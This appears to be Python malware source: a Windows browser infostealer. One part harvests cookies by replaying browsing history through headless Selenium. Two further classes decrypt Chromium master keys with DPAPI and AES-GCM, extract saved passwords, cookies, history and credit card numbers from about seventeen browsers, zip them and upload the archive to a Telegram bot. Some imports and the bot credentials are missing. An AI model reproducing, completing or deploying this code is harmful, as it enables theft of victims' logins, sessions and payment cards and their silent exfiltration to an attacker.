import os
import zipfile
import tempfile
import requests
import shutil
import subprocess
import win32api
import sqlite3
from pathlib import Path
from urllib.parse import urlparse
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
import psutil
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.edge.service import Service as EdgeService
from selenium.webdriver.edge.options import Options as EdgeOptions

ExcludedHosts = {
    "localhost", "127.0.0.1", "::1", "0.0.0.0", "10.0.0.0", "100.64.0.0", "127.0.0.0",
    "169.254.0.0", "172.16.0.0", "192.0.0.0", "192.0.2.0", "192.88.99.0", "192.168.0.0",
    "198.18.0.0", "198.51.100.0", "203.0.113.0", "224.0.0.0", "240.0.0.0", "255.255.255.255",
    "::", "100::", "2001::", "2001:db8::", "fc00::", "fe80::", "ff00::"
}

# EdgeDriver Install shit
InstallDir = r"C:\WebDrivers"
os.makedirs(InstallDir, exist_ok=True)
DriverPath = os.path.join(InstallDir, "msedgedriver.exe")

def GetEdgeVersion() -> str:
    output = subprocess.check_output(r'reg query "HKEY_CURRENT_USER\Software\Microsoft\Edge\BLBeacon" /v version', shell=True, text=True)
    return output.strip().split()[-1]

def GetFileVersion(file_path: str) -> str:
    info = win32api.GetFileVersionInfo(file_path, "\\")
    ms = info['FileVersionMS']
    ls = info['FileVersionLS']
    return f"{ms >> 16}.{ms & 0xFFFF}.{ls >> 16}.{ls & 0xFFFF}"

def FindBrowserPaths(): # NOT ALL TESTED
    Env = {"LOCALAPPDATA": os.environ["LOCALAPPDATA"], "APPDATA": os.environ["APPDATA"]}
    Browsers = {
        "OPERA": (r"%LOCALAPPDATA%\Programs\Opera\launcher.exe", ["APPDATA", "Opera Software", "Opera Stable"]),
        "OPERA_GX": (r"%LOCALAPPDATA%\Programs\Opera GX\launcher.exe", ["APPDATA", "Opera Software", "Opera GX Stable"]),
        "VIVALDI": (r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe", ["LOCALAPPDATA", "Vivaldi", "User Data"]),
        "CHROME_SXS": (r"C:\Program Files (x86)\Google\Chrome SxS\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome SxS", "User Data"]),
        "CHROME": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", ["LOCALAPPDATA", "Google", "Chrome", "User Data"]),
        "MICROSOFT_EDGE": (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ["LOCALAPPDATA", "Microsoft", "Edge", "User Data"]),
        "YANDEX": (r"%LOCALAPPDATA%\Yandex\YandexBrowser\Application\browser.exe", ["LOCALAPPDATA", "Yandex", "YandexBrowser", "User Data"]),
        "BRAVE": (r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", ["LOCALAPPDATA", "BraveSoftware", "Brave-Browser", "User Data"]),
        "FIREFOX": (None, ["APPDATA", "Mozilla", "Firefox", "Profiles"])
    }

    Installed = {}
    for Name, (ExeTemplate, UserDataParts) in Browsers.items():
        if Name == "FIREFOX":
            ProfileBase = os.path.join(os.environ[UserDataParts[0]], *UserDataParts[1:])
            if not os.path.isdir(ProfileBase):
                continue
            for Profile in os.listdir(ProfileBase):
                CookiesPath = os.path.join(ProfileBase, Profile, "cookies.sqlite")
                if os.path.exists(CookiesPath):
                    Installed[Name] = {"USER_DATA_DIR": os.path.join(ProfileBase, Profile)}
                    break
            continue

        ExePath = os.path.expandvars(ExeTemplate)
        if not os.path.isfile(ExePath):
            continue
        UserDataDir = os.path.join(os.environ[UserDataParts[0]], *UserDataParts[1:])
        if not os.path.isdir(UserDataDir):
            continue
        Installed[Name] = {"EXE_PATH": ExePath, "USER_DATA_DIR": UserDataDir}
    return Installed

def IsBrowserRunning(ExePath): # Browsers (may) use a profile lock etc.., so I prefer not to handle that and just not run if the browser is open
    if not ExePath:
        return False
    ExeName = os.path.basename(ExePath).lower()
    for Proc in psutil.process_iter(['name']):
        try:
            if Proc.info['name'] and Proc.info['name'].lower() == ExeName:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def IsValidHost(Host):
    try:
        Ip = ipaddress.ip_address(Host)
        return not Ip.is_loopback
    except:
        return bool(Host) and '.' in Host and ',' not in Host and '*' not in Host

def GetCleanUrls(HistoryPath: Path):
    TempHistory = Path("History_temp")
    shutil.copy2(HistoryPath, TempHistory)
    Conn = sqlite3.connect(TempHistory)
    Cursor = Conn.cursor()
    Cursor.execute("SELECT url FROM urls")
    Urls = set()
    for (RawUrl,) in Cursor.fetchall():
        if RawUrl.startswith(("http://", "https://")):
            Parsed = urlparse(RawUrl)
            Host = Parsed.hostname
            if Host and Host not in ExcludedHosts and IsValidHost(Host):
                Urls.add(f"{Parsed.scheme}://{Parsed.netloc}/")
    Conn.close()
    TempHistory.unlink()
    return sorted(Urls)

def IsAuthProtected(Url):
    try:
        R = requests.get(Url, timeout=3, allow_redirects=True)
        return R.status_code == 401 and 'www-authenticate' in R.headers
    except:
        return False

def FilterUrlsConcurrently(Urls): # Filter URLs since Selenium stops on websites that have a WWW-Authenticate
    from sys import stdout
    Filtered = []
    Total = len(Urls)
    Completed = 0
    print(f"Filtering {Total} URLs...")

    with ThreadPoolExecutor(max_workers=55) as Executor:
        Futures = {Executor.submit(IsAuthProtected, Url): Url for Url in Urls}
        try:
            for Future in as_completed(Futures):
                Url = Futures[Future]
                Completed += 1
                progress = int((Completed / Total) * 40)
                bar = "[" + "#" * progress + "-" * (40 - progress) + "]"
                stdout.write(f"\r{bar} {Completed}/{Total} URLs checked")
                stdout.flush()
                try:
                    Result = Future.result()
                    if not Result:
                        Filtered.append(Url)
                    else:
                        print(f"\nSKIPPED AUTH-PROTECTED: {Url}")
                except Exception as E:
                    print(f"\nSKIPPED FAILED CHECK: {Url} ({E})")
        except KeyboardInterrupt:
            print("\n[KeyboardInterrupt] Cancelling URL filtering...")
            for future in Futures:
                if not future.done():
                    future.cancel()
    print(f"\nCompleted. {len(Filtered)} URLs remain after filtering.")
    return Filtered

def CreateDriver(ExePath, UserDataDir, BrowserName):
    if BrowserName == "MICROSOFT_EDGE":
        EdgeVersion = GetEdgeVersion()
        # print(f"Edge version: {EdgeVersion}")

        NeedDownload = True
        if os.path.isfile(DriverPath):
            DriverVersion = GetFileVersion(DriverPath)
            # print(f"Existing EdgeDriver version: {DriverVersion}")
            if DriverVersion.startswith(EdgeVersion):
                NeedDownload = False
                # print("EdgeDriver is up to date.")

        if NeedDownload:
            DriverUrl = f"https://msedgedriver.microsoft.com/{EdgeVersion}/edgedriver_win64.zip"
            with tempfile.TemporaryDirectory() as TmpDir:
                ZipPath = os.path.join(TmpDir, "edgedriver.zip")
                response = requests.get(DriverUrl)
                response.raise_for_status()
                with open(ZipPath, "wb") as f:
                    f.write(response.content)
                with zipfile.ZipFile(ZipPath, "r") as zip_ref:
                    zip_ref.extractall(TmpDir)
                ExtractedDriver = os.path.join(TmpDir, "msedgedriver.exe")
                shutil.copy2(ExtractedDriver, DriverPath)
            # print(f"EdgeDriver installed: {DriverPath}")

        options = EdgeOptions()
        options.binary_location = ExePath
        options.add_argument(f"--user-data-dir={UserDataDir}")
        options.add_argument("--profile-directory=Default")
        options.add_argument("--headless=new")
        options.page_load_strategy = "eager"
        service = EdgeService(executable_path=DriverPath)
        return webdriver.Edge(service=service, options=options)
    else:
        options = Options()
        options.binary_location = ExePath
        options.add_argument(f"--user-data-dir={UserDataDir}")
        options.add_argument("--profile-directory=Default")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--headless=new")
        options.page_load_strategy = "eager"
        return webdriver.Chrome(options=options)


def ExtractFirefoxCookies(ProfilePath):
    TempPath = tempfile.mktemp()
    shutil.copy2(os.path.join(ProfilePath, 'cookies.sqlite'), TempPath)
    Conn = sqlite3.connect(TempPath)
    Cursor = Conn.cursor()
    Cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
    Cookies = Cursor.fetchall()
    Conn.close()
    os.remove(TempPath)
    return Cookies

def Main():
    Browsers = FindBrowserPaths()
    try:
        for Name, Paths in Browsers.items():
            print(f"--- browser: {Name} ---")

            if Name != "FIREFOX" and IsBrowserRunning(Paths["EXE_PATH"]):
                print(f"SKIPPED {Name} - PROCESS IN USE")
                continue

            if Name == "FIREFOX": # Using old method on Firefox, since its not patched. :D
                try:
                    Cookies = ExtractFirefoxCookies(Paths["USER_DATA_DIR"])
                    for C in Cookies:
                        print(f'Host: {C[0]}\nName: {C[1]}\nValue: {C[2]}\nPath: {C[3]}\nExpiry: {C[4]}\nSecure: {bool(C[5])}\nHttpOnly: {bool(C[6])}\n---')
                except Exception as E:
                    print(f"FAILED TO EXTRACT FIREFOX COOKIES: {E}")
                continue

            HistoryPath = Path(Paths["USER_DATA_DIR"]) / "Default" / "History"
            if not HistoryPath.exists():
                print(f"History file not found for {Name}: {HistoryPath}")
                continue

            try:
                Urls = GetCleanUrls(HistoryPath)
            except Exception as e:
                print(f"Failed to read history for {Name}: {e}")
                continue

            Urls = FilterUrlsConcurrently(Urls)

            try:
                # Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"])
                Driver = CreateDriver(Paths["EXE_PATH"], Paths["USER_DATA_DIR"], Name)
            except Exception as e:
                print(f"Failed to create driver for {Name}: {e}")
                continue

            Wait = WebDriverWait(Driver, 5)

            try:
                for Url in Urls:
                    try:
                        Driver.get(Url)
                        Wait.until(lambda d: d.execute_script("return document.readyState") == "complete")
                        Cookies = Driver.get_cookies()
                        print(f"Cookies for {Url}")
                        for Cookie in Cookies:
                            print(Cookie)
                        print("-" * 40)
                    except Exception:
                        print(f"FAILED: {Url}")
            except KeyboardInterrupt:
                print("\n[KeyboardInterrupt] Quitting driver...")
            finally:
                Driver.quit()
            print("Finally Completed...")
    except KeyboardInterrupt:
        print("\n[KeyboardInterrupt] Exiting.")

#----------------------------------------------------------------------------


class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.create_zip_and_send()

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(self.temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = self.create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(self.temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def create_zip_and_send(self):
        file_paths = [
            os.path.join(self.temp_path, "Browser", "passwords.txt"),
            os.path.join(self.temp_path, "Browser", "cookies.txt"),
            os.path.join(self.temp_path, "Browser", "history.txt"),
            os.path.join(self.temp_path, "Browser", "cc's.txt")
        ]
        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
        self.create_zip(file_paths, zip_file_path)
        self.send_file_to_telegram(zip_file_path)

        for file in file_paths:
            if os.path.isfile(file):
                os.remove(file)
        if os.path.isfile(zip_file_path):
            os.remove(zip_file_path)

    def create_zip(self, file_paths: list, zip_path: str):
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file in file_paths:
                if os.path.isfile(file):
                    zipf.write(file, os.path.basename(file))

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3 
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print("Gửi tệp thành công")
                    return response
                else:
                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Lần thử {attempt + 1} thất bại: {e}")
                if attempt < retries - 1:
                    time.sleep(5) 
                else:
                    print("Đã thử tối đa. Không thể gửi tệp.")
        return None

    def create_temp(self, _dir: Union[str, os.PathLike] = None):
        if _dir is None:
            _dir = os.path.expanduser("~/tmp")
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x").close()
        return path

# ---------------------------------------------------

class Browser:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.create_zip_file()
        self.send_file_to_telegram("password_full.zip")
        os.remove("password_full.zip")

    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  

        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key

    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            return None

    def extract_passwords(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                login_db_path = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                shutil.copyfile(login_db_path, tmp_db_path)

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue

                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("=" * 120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)

                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")

                    password_data.write("\n")  
                    
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())

                except Exception as e:
                    print(f"Error extracting from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def extract_history(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                history_db_path = os.path.join(browser_path, profile, 'History')
                if not os.path.exists(history_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    print(f"Không thể sao chép tệp {history_db_path}. Có thể tệp đang được sử dụng.")
                    continue  
                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("=" * 120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        last_visit_time = row[3]

                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")

                    history_data.write("\n") 
                    
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())

                except Exception as e:
                    print(f"Error extracting history from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def create_zip_file(self):
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3  
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print("Gửi tệp thành công")
                    return response
                else:
                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Lần thử {attempt + 1} thất bại: {e}")
                if attempt < retries - 1:
                    time.sleep(5)  
                else:
                    print("Đã thử tối đa. Không thể gửi tệp.")
        return None
